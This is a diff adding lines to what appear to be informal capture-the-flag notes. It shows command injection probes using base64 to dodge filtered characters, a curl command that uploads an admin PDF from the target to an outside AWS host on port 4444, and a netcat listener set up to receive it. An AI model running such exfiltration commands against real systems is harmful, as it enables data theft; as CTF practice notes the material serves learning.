@@ -58,4 +58,13 @@ flag 2
 ls | base64     <--- base64 avoids bad charas
 whoami  <-- letters 
 
+on the machine i used
+curl -F "var=@/pathtoadmin.pdf" aws_public_ipv4:4444
+
+had to port forward the port to allow to listen on aws
+curl ifconfig.me to get public ip address
+
+on linux machine 
+0.0.0.0 <-- listens to any interface
+nc -l -s 0.0.0.0 -p 4444
 
